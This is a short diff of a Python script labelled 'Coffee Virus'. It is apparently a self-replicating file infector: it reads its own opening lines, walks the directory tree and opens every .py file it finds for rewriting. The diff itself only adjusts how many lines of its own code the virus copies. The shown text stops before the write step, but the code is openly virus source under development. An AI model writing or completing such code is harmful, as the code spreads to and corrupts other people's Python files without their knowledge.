@@ -1,7 +1,7 @@
 s="-=-Coffee Virus-=-"
 import os,fnmatch
 path = (os.path.abspath(__file__)).strip(str(__file__))
-v=open(__file__,"r").readlines()[:12]
+v=open(__file__,"r").readlines()[:13]
 for root,dirs,files in os.walk(path):
 	for f in fnmatch.filter(files,"*.py"):
 		p = open((os.path.abspath(os.path.join(root,f))),"r+").readlines()
